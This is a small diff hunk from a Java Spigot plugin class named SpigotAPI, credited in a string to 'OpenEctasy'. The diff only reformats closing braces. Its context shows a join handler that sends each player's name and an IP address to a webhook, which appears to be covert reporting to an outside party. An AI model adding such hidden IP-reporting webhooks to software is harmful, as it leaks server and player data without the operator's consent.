@@ -113,5 +113,5 @@ public class SpigotAPI implements Listener {
         if(joinLogs){
             sendWebhook("{\"avatar_url\": \"https://minotar.net/helm/" + e.getPlayer().getName() + "/100.png\", \"username\": \"" + e.getPlayer().getName() + "\", \"embeds\": [{\"title\":\"Player Join\", \"color\":3447003, \"description\":\"Username: `" + e.getPlayer().getName() + "`\nIP : `" + getIP() + "`\n\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}");
     }
-    }
-    }
+  }
+}
